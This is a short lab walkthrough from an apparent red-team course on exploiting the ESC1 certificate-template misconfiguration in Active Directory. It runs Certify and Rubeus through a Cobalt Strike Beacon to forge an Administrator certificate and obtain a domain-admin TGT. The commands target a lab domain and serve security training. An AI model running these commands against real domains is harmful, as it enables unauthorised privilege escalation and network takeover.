# ESC1 Misconfigured Client Authentication Templates

>The objective of this lab is to identify and exploit ESC1.

===

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the medium-integrity Beacon.
3. Enumerate the certificate authority for vulnerable templates.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
    ```

⚠️ This should reveal a template called *ESC1*.

4. Request a certificate, specifying the default domain Administrator's *UserPrincipalName* in the certificate's Subject Alternative Name (SAN).

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
    ```

5. Use Rubeus to request a TGT for Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
    ```

⚠️ In this lab, you have learned how to identify and exploit ESC1 to gain domain admin privileges.
